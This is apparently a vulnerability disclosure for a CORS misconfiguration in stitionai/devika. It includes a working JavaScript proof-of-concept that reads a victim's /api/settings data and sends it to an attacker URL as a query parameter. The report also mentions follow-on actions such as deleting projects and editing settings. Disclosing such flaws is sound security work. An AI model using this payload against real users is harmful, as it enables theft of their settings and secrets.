Title: Data leak through CORS misconfiguration in stitionai/devika

Proof of Concept: 
1- Create the following file in the attacker server:

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','http://127.0.0.1:1337/api/settings',true); // victim data

    req.send();
    function reqListener() {
        console.log(this.responseText);
        location='http://127.0.0.1:8888/?k='+encodeURIComponent(this.responseText); --> attacker URL
    };
 </script>

2- Make the user open the following URL: http://[attackerURL]/index.html

3- When the user opens this, the code runs and the information is obtained by the attacker.

User opened the malicious URL.

Data stolen by the attacker.

4- Other actions such as creating/deleting a project, sending messages, editing settings can be done.

Impact: 
Information integrity - confidentiality.
